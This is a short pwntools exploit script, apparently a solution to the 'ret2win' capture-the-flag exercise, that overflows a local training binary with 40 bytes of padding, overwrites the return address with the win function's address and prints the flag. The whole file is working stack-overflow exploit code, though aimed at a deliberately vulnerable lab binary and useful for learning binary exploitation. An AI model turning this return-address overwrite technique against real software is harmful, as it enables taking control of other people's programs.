from pwn import *

# ret after 40 chars
# ret to sym.ret2win == 0x00400811
buf = "Z" * 40 # why let the A's have all the fun
buf += p64(0x00400811)

context.update(binary='ret2win', log_level='info')
ret2win = ELF('ret2win')

# easier way to find ret address
#return_address = ret2win.functions.ret2win.address
#info('ret2win function address is at {}'.format(hex(return_address)))
#fun = p64(return_address)
#buf += fun

p = process(ret2win.path)
p.recvuntil('> ')
p.sendline(buf)
flag = p.recvall()
print ""
print flag
